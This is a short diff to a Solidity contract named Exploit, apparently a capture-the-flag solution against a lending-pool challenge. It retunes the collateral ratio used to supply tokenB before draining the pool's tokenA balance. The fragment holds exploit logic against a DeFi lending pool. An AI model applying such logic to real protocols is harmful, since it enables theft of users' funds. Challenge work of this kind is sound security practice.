@@ -58,7 +58,8 @@ contract Exploit {
         uint256 withdrawAmount = setup.tokenA().balanceOf(
             address(setup.lendingPool())
         );
-        uint256 depositAmount = (((withdrawAmount * lpB) / lpA) * 40) / 29; // Power
+        uint256 depositAmount = (((withdrawAmount * lpB) / lpA) * 40000) /
+            29999; // Power
 
         setup.tokenB().approve(address(setup.lendingPool()), type(uint256).max);
         setup.lendingPool().supply(address(setup.tokenB()), depositAmount);
